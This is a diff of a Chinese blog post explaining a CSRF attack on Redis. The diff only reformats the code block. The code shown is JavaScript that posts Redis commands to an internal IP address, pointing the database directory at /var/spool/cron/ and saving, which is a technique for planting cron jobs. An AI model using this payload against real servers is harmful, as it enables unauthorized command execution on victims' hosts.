@@ -39,13 +39,8 @@ share: true
 `SAVE`
 
 将这些命令编码，并构造成CSRF攻击页面，具体代码如下：
-~~~
-<html>
-  <head>
-   <meta charset="UTF-8">
-   <title>Redis CSRF利用</title>
-   <script src="http://code.jquery.com/jquery-3.1.0.min.js"></script>
-   <script>
+
+{% highlight javascript %}
 
       alert("向redis发送第一次请求");
 	  var payload = "CONFIG SET dir /var/spool/cron/ \r\n\r\n";
@@ -63,14 +58,8 @@ share: true
 	  alert("向redis发送第四次请求");
 	  payload = "SAVE\r\n\r\n";
       $.post("http://192.168.33.130:6379", payload, function(data){alert(data);});
-   </script>
-  </head>
-  <body>
-    Redis CSRF利用
-  </body>
-</html>
 
-~~~
+{% endhighlight %}
 
 ### 攻击效果
 
